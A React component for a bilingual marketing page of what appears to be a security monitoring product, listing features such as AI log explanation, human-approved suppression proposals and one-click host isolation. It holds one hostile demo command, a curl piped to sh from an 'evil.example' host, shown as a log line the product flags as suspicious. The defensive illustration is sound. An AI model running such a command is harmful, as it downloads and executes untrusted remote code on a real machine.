import { Brain, Cpu, Fingerprint, Globe2, Layers, MessageSquareText, ScrollText, ServerCog, ShieldCheck, Zap } from "lucide-react";
import { motion } from "motion/react";
import type { ReactNode } from "react";
import { useCopy, useLocale } from "@/i18n";
import { EASE } from "./chapter";

type Tile = { title: string; desc: string };

const COPY = {
  "zh-CN": {
    title: (
      <>
        还有更多，
        <br />
        <span className="text-neutral-500">藏在细节里。</span>
      </>
    ),
    tiles: {
      ask: { title: "看不懂的日志，问一句。", desc: "说清它在做什么、要不要紧，再顺着进程链、同一连接、同一远端，把相关的日志一并找出来。" },
      propose: { title: "AI 提议，你拍板。", desc: "哪条误报该压、事件怎么结案，AI 先写好理由和草案。你批准之前，什么都不生效。" },
      attack: { title: "缺口，一眼看见。", desc: "ATT&CK 矩阵按规则数着色，有规则却没数据源的格子单独标出。每次提交，都用真实攻击命令回放验证。" },
      egress: { title: "每个外连地址，都有来历。", desc: "反向解析与 VirusTotal 自动补全归属。足够多的引擎判恶意，直接进情报。" },
      sensor: { title: "不存包，也看得清。", desc: "流量探针只留会话元数据：DNS、TLS 指纹与证书、HTTP 头。" },
      memory: { title: "它记得你的环境。", desc: "哪台主机夜里跑备份、哪类告警在这里正常，说过一次就记住。可查、可改、可删，人写的优先。" },
      collapse: { title: "例行公事，自动收起。", desc: "同一个父进程反复执行同一条命令，折成一条汇总。一旦它做了别的事，完整的进程血缘立刻补上。" },
      respond: { title: "处置，一键到位。", desc: "结束进程、隔离主机。总开关与放行清单兜底，每一步都留痕。" },
      anywhere: { title: "哪里都能装，自己会升级。", desc: "Linux、Windows、容器。eBPF、ETW 不可用就自动降级；新版本放进分发目录，在线 agent 自己换上。" },
      prod: { title: "为生产而生。", desc: "mTLS 主机证书、三档权限、分片队列、Patroni 高可用。" },
    } satisfies Record<string, Tile>,
    v: {
      log: "curl -s http://x.evil.example/i.sh | sh",
      verdict: "可疑",
      rel: ["父进程链 2", "同一连接 1", "同一远端 · 3 台主机"],
      proposal: "抑制提议 · 90 天",
      cond: "条件：域名 = updates.example.com",
      approve: "批准",
      reject: "拒绝",
      vt: "AS64500 · NL · 5 家引擎判恶意",
      intel: "已加入情报",
      mem: ["backup-01 每天 01:00 跑 rsync，属正常", "10.0.9.2 是机房 UPS 管理口"],
      folded: "×128 · 10 分钟",
    },
  },
  en: {
    title: (
      <>
        And more.
        <br />
        <span className="text-neutral-500">It's all in the details.</span>
      </>
    ),
    tiles: {
      ask: { title: "Puzzled by a log? Just ask.", desc: "It explains what the log is doing and whether it matters, then follows the process chain, the connection and the remote peer to pull in what's related." },
      propose: { title: "AI proposes. You decide.", desc: "Which noise to mute, how to close an incident — the AI drafts it with its reasoning. Nothing takes effect until you approve." },
      attack: { title: "Gaps, at a glance.", desc: "The ATT&CK matrix is shaded by rule count; techniques with rules but no data source are flagged. Every commit replays real attack commands." },
      egress: { title: "Every outbound address, explained.", desc: "Reverse DNS and VirusTotal fill in who owns it. Flagged by enough engines, it becomes intel." },
      sensor: { title: "No packet capture. Full picture.", desc: "The sensor keeps session metadata only: DNS, TLS fingerprints and certificates, HTTP headers." },
      memory: { title: "It remembers your environment.", desc: "Which host runs backups at night, which alerts are normal here — tell it once. View, edit or delete anytime; yours take priority." },
      collapse: { title: "Routine work, folded away.", desc: "When a parent runs the same command over and over, it folds into one summary. The moment it does anything else, the full lineage comes back." },
      respond: { title: "Respond in one click.", desc: "Kill a process, isolate a host. A global switch and an allowlist guard it, and every step is on record." },
      anywhere: { title: "Runs anywhere. Updates itself.", desc: "Linux, Windows, containers. Falls back gracefully without eBPF or ETW; drop in a new build and online agents update themselves." },
      prod: { title: "Built for production.", desc: "mTLS host certificates, role-based access, sharded queues, Patroni high availability." },
    } satisfies Record<string, Tile>,
    v: {
      log: "curl -s http://x.evil.example/i.sh | sh",
      verdict: "Suspicious",
      rel: ["Parent chain 2", "Same connection 1", "Same peer · 3 hosts"],
      proposal: "Suppression proposal · 90 days",
      cond: "When: domain = updates.example.com",
      approve: "Approve",
      reject: "Reject",
      vt: "AS64500 · NL · 5 engines flag it",
      intel: "Added to intel",
      mem: ["backup-01 runs rsync at 01:00 daily — expected", "10.0.9.2 is the rack UPS console"],
      folded: "×128 · 10 min",
    },
  },
};

// ATT&CK 示意格：0 无规则，1-3 规则数深浅，-1 有规则无数据源
const MATRIX = [3, 2, 0, 1, 3, 2, 1, 0, 2, 3, 1, 2, 1, 0, 3, -1, 2, 1, 0, 2, 1, 3, 0, 1, 2, 1, -1, 3, 2, 0, 1, 2, 3, 1, 0, 2];

function Visuals({ id }: { id: string }) {
  const { v } = useCopy(COPY);
  switch (id) {
    case "ask":
      return (
        <div className="space-y-3">
          <div className="flex items-center gap-2 rounded-lg border border-white/10 bg-black/40 px-3 py-2">
            <code className="truncate font-mono text-xs text-neutral-300">{v.log}</code>
            <span className="ml-auto shrink-0 rounded-full bg-amber-400/15 px-2 py-0.5 text-[10px] text-amber-200">{v.verdict}</span>
          </div>
          <div className="flex flex-wrap gap-2">
            {v.rel.map((r) => (
              <span key={r} className="rounded-full border border-sky-300/20 bg-sky-400/[0.06] px-2.5 py-1 text-[11px] text-sky-200">
                {r}
              </span>
            ))}
          </div>
        </div>
      );
    case "propose":
      return (
        <div className="rounded-lg border border-white/10 bg-black/40 p-3 text-xs">
          <p className="text-neutral-200">{v.proposal}</p>
          <p className="mt-1 font-mono text-[11px] text-neutral-500">{v.cond}</p>
          <div className="mt-3 flex gap-2">
            <span className="rounded-full bg-white px-3 py-1 text-[11px] font-medium text-neutral-950">{v.approve}</span>
            <span className="rounded-full border border-white/15 px-3 py-1 text-[11px] text-neutral-300">{v.reject}</span>
          </div>
        </div>
      );
    case "attack":
      return (
        <div className="grid grid-cols-12 gap-1" aria-hidden>
          {MATRIX.map((n, i) => (
            <span
              key={i}
              className={`aspect-square rounded-[3px] ${
                n < 0 ? "border border-dashed border-amber-300/70" : ["bg-white/[0.04]", "bg-emerald-400/25", "bg-emerald-400/50", "bg-emerald-400/80"][n]
              }`}
            />
          ))}
        </div>
      );
    case "egress":
      return (
        <div className="rounded-lg border border-white/10 bg-black/40 p-3 text-xs">
          <p className="font-mono text-neutral-200">203.0.113.7</p>
          <p className="mt-1 text-neutral-500">{v.vt}</p>
          <span className="mt-2 inline-block rounded-full bg-rose-400/15 px-2 py-0.5 text-[10px] text-rose-200">{v.intel}</span>
        </div>
      );
    case "sensor":
      return (
        <div className="space-y-1 rounded-lg border border-white/10 bg-black/40 p-3 font-mono text-[11px] text-neutral-400">
          <p>
            <span className="text-neutral-600">SNI </span>api.example.com
          </p>
          <p>
            <span className="text-neutral-600">JA3 </span>e7d705a3286e19ea42f587b344ee6865
          </p>
          <p>
            <span className="text-neutral-600">CN </span>self-signed · 12d
          </p>
        </div>
      );
    case "memory":
      return (
        <div className="space-y-2">
          {v.mem.map((m) => (
            <p key={m} className="rounded-lg border border-white/10 bg-black/40 px-3 py-2 text-[11px] text-neutral-300">
              {m}
            </p>
          ))}
        </div>
      );
    case "collapse":
      return (
        <div className="relative font-mono text-[11px]">
          {[0.12, 0.2, 0.32].map((o, i) => (
            <p key={i} className="truncate px-3 py-1 text-neutral-500" style={{ opacity: o }}>
              pve-firewall → /usr/sbin/ebtables-save
            </p>
          ))}
          <p className="mt-1 flex items-center gap-2 rounded-lg border border-emerald-300/25 bg-emerald-400/[0.06] px-3 py-2 text-emerald-100">
            <span className="truncate">pve-firewall → /usr/sbin/ebtables-save</span>
            <span className="ml-auto shrink-0 text-emerald-300">{v.folded}</span>
          </p>
        </div>
      );
    default:
      return null;
  }
}

const LAYOUT: { id: keyof (typeof COPY)["en"]["tiles"]; icon: ReactNode; wide?: boolean }[] = [
  { id: "ask", icon: <MessageSquareText />, wide: true },
  { id: "propose", icon: <ShieldCheck /> },
  { id: "attack", icon: <Layers /> },
  { id: "egress", icon: <Globe2 /> },
  { id: "sensor", icon: <Fingerprint /> },
  { id: "memory", icon: <Brain /> },
  { id: "collapse", icon: <ScrollText />, wide: true },
  { id: "respond", icon: <Zap /> },
  { id: "anywhere", icon: <Cpu /> },
  { id: "prod", icon: <ServerCog /> },
];

export function Features() {
  const t = useCopy(COPY);
  const locale = useLocale();
  return (
    <section id="more" className="relative scroll-mt-20 px-4 py-28 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-[1400px]">
        <motion.h2
          initial={{ opacity: 0, y: 24 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-80px" }}
          transition={{ duration: 0.8, ease: EASE }}
          className="text-3xl font-medium leading-[1.08] tracking-[-0.03em] text-white sm:text-5xl"
        >
          {t.title}
        </motion.h2>
        <div className="mt-14 grid gap-4 md:grid-flow-dense md:grid-cols-2 lg:grid-cols-3">
          {LAYOUT.map(({ id, icon, wide }, i) => (
            <motion.article
              key={`${locale}-${id}`}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, margin: "-60px" }}
              transition={{ duration: 0.6, ease: EASE, delay: (i % 3) * 0.08 }}
              className={`flex min-w-0 flex-col rounded-2xl border border-white/10 bg-white/[0.02] p-6 transition-colors hover:bg-white/[0.04] ${
                wide ? "md:col-span-2" : ""
              }`}
            >
              <span className="text-emerald-300 [&>svg]:h-5 [&>svg]:w-5">{icon}</span>
              <h3 className="mt-4 text-lg font-medium tracking-tight text-white">{t.tiles[id].title}</h3>
              <p className="mt-2 text-sm leading-relaxed text-neutral-400">{t.tiles[id].desc}</p>
              <div className="mt-auto pt-6">
                <Visuals id={id} />
              </div>
            </motion.article>
          ))}
        </div>
      </div>
    </section>
  );
}
